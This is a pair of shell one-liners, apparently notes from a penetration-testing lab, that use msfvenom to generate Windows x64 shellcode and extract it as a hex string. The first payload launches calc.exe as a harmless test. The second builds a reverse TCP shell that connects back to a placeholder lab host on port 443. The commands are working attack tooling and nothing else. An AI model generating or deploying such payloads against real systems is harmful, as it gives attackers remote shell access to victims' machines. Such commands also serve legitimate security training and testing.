msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00' | grep -o '\\x[0-9a-fA-F]\{2\}' | tr -d '\n'


msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_LAB_IP LPORT=443 -f c -b '\x00' | grep -o '\\x[0-9a-fA-F]\{2\}' | tr -d '\n'
